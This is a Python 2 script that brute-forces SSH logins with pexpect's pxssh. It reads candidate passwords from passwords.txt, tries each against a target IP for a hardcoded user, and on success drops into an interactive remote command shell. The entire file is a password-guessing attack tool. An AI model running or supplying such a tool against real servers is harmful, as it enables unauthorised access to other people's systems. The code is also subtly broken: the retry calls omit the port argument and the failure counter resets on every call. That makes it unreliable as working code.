from pexpect import pxssh
import argparse
import time


def connect(host, user, password, port):              #take host user and password
    global Found
    Fails = 0

    try:
        s = pxssh.pxssh()                       #s is ssh session
        s.login(host, user, password, port)           #try to login
        print 'Password Found: ' + password
        return s

    except Exception, e:
        if Fails > 10000:                       #Check 10,000 lines in the file
            print "I chaecked 10,000 passwords"
            exit(0)
        elif 'read_nonblocking' in str(e):
            Fails += 1
            return connect(host, user, password)
        elif 'synchronize with original prompt' in str(e):
            #time.sleep(1)
            return connect(host, user, password)
        return None


def main(host,user,port):
  if host and user and port:
         with open("passwords.txt", 'r') as infile:     #open the file
            for line in infile:
                password = line.strip('\r\n')
                print "Testing: " + str(password)
                con = connect(host, user, password, port)    #trying to connect with the ip,username and password
                if con:
                    print "[SSH connected, Issue commands (q or Q) To quit]"
                    command = raw_input(">")
                    while command != 'q' and command != 'Q':
                        con.sendline(command)
                        con.prompt()
                        print con.before
                        command = raw_input(">")
  else:
       #print parser.usage
       exit(0)
ip=raw_input("ip Destination: ")
main(ip,"merav","22")

